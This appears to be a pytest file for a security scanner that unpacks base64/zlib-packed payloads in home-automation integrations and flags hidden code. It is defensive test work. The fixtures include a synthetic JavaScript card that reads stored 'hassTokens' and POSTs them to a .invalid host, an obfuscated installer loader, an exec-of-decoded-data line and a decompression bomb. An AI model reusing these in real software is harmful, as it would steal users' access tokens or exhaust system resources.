"""(0.15, his decision 2026-11-22) Packed text is unpacked as data and read; pictures and
keys are data. Synthetic; hosts are .invalid. Nothing runs: decoding with output limits.
"""

from __future__ import annotations

import base64
import json
import shutil
import time
import zlib
from pathlib import Path

import pytest

from sniff_test.analyzers import packed, semgrep
from sniff_test.models import Category, Finding, Severity, Target, TargetKind

needs_semgrep = pytest.mark.skipif(shutil.which("semgrep") is None, reason="needs semgrep")

CARD = (
    "const t = localStorage.getItem('hassTokens');\n"
    "fetch('https://collect.invalid/c', {method: 'POST', body: t});\n"
) + "".join(f"const v{i} = {i * 7919 % 104729};\n" for i in range(200))
NOISE = bytes((i * 7919) % 251 for i in range(600))  # doesn't compress much


def _pack(obj: object) -> str:
    raw = obj.encode() if isinstance(obj, str) else json.dumps(obj).encode()
    return base64.b64encode(zlib.compress(raw)).decode()


def _installer(payload: str) -> str:
    return (
        "import base64, json, zlib\n\n"
        f'PAYLOAD = "{payload}"\n\n\n'
        "def load():\n"
        "    return json.loads(zlib.decompress(base64.b64decode(PAYLOAD)).decode())\n"
    )


def test_packed_json_is_unpacked_with_its_files_and_edits(tmp_path):
    payload = _pack({
        "files": {"motor.js": _pack(CARD)},
        "edits": [{"file": "custom_components/other_app/const.py", "old": "X = 1\n" * 20,
                   "new": "X = 2\nRESOURCES = ['/x/motor.js']\n" * 10}],
    })  # fmt: skip
    (tmp_path / "install.py").write_text(_installer(payload))
    u = packed.unpack(tmp_path)
    names = sorted(Path(f).name for f in u.files)
    assert "motor.js" in names and any(n.endswith("const.py") for n in names)
    assert (tmp_path / packed.FOLDER).is_dir()
    assert u.other_apps == {"other_app"} and u.sources == [("install.py", 3)]
    notes = {n.rule_id: n for n in packed.notes(u, "acme")}
    assert set(notes) == {packed.CARRIES, packed.OTHER_APP}
    assert all(n.severity is Severity.INFO for n in notes.values())
    assert "custom_components/other_app" in notes[packed.OTHER_APP].message
    # its own folder isn't another app's
    assert packed.OTHER_APP not in {n.rule_id for n in packed.notes(u, "other_app")}


def test_the_unpacked_folder_is_removed_after_reading(tmp_path):
    (tmp_path / "a.py").write_text(_installer(_pack(CARD)))
    with packed.unpacked(tmp_path) as u:
        assert u.files and (tmp_path / packed.FOLDER).exists()
    assert not (tmp_path / packed.FOLDER).exists()


def test_caps_hold_on_a_hostile_blob(tmp_path):
    # 200 MB of zeros packs to a few hundred KB: over the ratio and the total
    bomb = base64.b64encode(zlib.compress(b"\0" * (200 * 1024 * 1024), 9)).decode()
    (tmp_path / "bomb.py").write_text(f'B = "{bomb}"\n')
    t0 = time.perf_counter()
    u = packed.unpack(tmp_path)
    assert time.perf_counter() - t0 < 5
    assert u.files == [] and u.too_big == [("bomb.py", 1)]
    assert [n.rule_id for n in packed.notes(u, None)] == [packed.TOO_BIG]


@pytest.mark.parametrize(
    "data,kind",
    [
        (b"\x89PNG\r\n\x1a\n" + NOISE, "binary:a PNG picture"),
        (b"\x30\x82\x01\x22" + NOISE, "binary:a key or certificate"),
        (zlib.compress(b"wOFF" + NOISE), "binary:a font"),
        (zlib.compress(CARD.encode()), "text"),
        (b"\x01\x02" + NOISE, "unknown"),
    ],
)
def test_what_a_blob_is(data, kind):
    assert packed.classify(base64.b64encode(data).decode())[0] == kind


def _ob(file: str, line: int) -> Finding:
    return Finding("py-obfuscation", "t", Severity.MEDIUM, Category.CODE_EXEC, "m",
                   file=file, line=line)  # fmt: skip


def test_an_unpacked_decode_or_a_picture_is_no_longer_obfuscation(tmp_path):
    png = base64.b64encode(b"\x89PNG\r\n\x1a\n" + NOISE).decode()
    code = (
        "import base64, json, zlib\n"
        f'PAYLOAD = "{_pack(CARD)}"\n'
        f'ICON = "{png}"\n'
        "def load():\n"
        "    return zlib.decompress(base64.b64decode(PAYLOAD))\n"
        "def icon():\n"
        "    return base64.b64decode(ICON)\n"
        "def run_it():\n"
        "    exec(base64.b64decode(ICON))\n"
    )
    (tmp_path / "a.py").write_text(code)
    u = packed.unpack(tmp_path)
    assert packed.explained(_ob("a.py", 5), tmp_path, u)  # unpacked and read
    assert packed.explained(_ob("a.py", 7), tmp_path, u)  # a picture
    assert not packed.explained(_ob("a.py", 9), tmp_path, u)  # handed to exec


@needs_semgrep
def test_what_is_inside_is_read_like_the_apps_own_files(tmp_path):
    root = tmp_path / "custom_components" / "acme"
    root.mkdir(parents=True)
    (root / "manifest.json").write_text('{"domain": "acme", "name": "Acme"}')
    (root / "install.py").write_text(_installer(_pack({"files": {"motor.js": _pack(CARD)}})))
    target = Target(source=str(root), kind=TargetKind.INTEGRATION, root=root, domain="acme")
    work = tmp_path / "work"
    work.mkdir()
    with packed.unpacked(root):
        found = semgrep.run(target, work).findings
    hits = {f.rule_id for f in found if (f.file or "").startswith(packed.FOLDER)}
    assert "card-token-exfil" in hits


def test_typed_constants_decoders_by_name_and_jpeg_tables(tmp_path):
    """(0.15) three shapes from the run: `X: bytes = b64decode(...)`, `from base64 import
    b64decode`, and a camera stream's JPEG table written in hex."""
    png = base64.b64encode(b"\x89PNG\r\n\x1a\n" + NOISE).decode()
    dht = (b"\xff\xc4\x01\xa2" + NOISE).hex()
    code = (
        "from base64 import b64decode\n"
        f'EMPTY: bytes = "{png}"\n'
        f'_DHT = "{dht}"\n'
        "def a():\n"
        "    return b64decode(EMPTY)\n"
        "def b():\n"
        "    return bytes.fromhex(_DHT)\n"
    )
    (tmp_path / "a.py").write_text(code)
    u = packed.unpack(tmp_path)
    assert packed.explained(_ob("a.py", 5), tmp_path, u)
    assert packed.explained(_ob("a.py", 7), tmp_path, u)
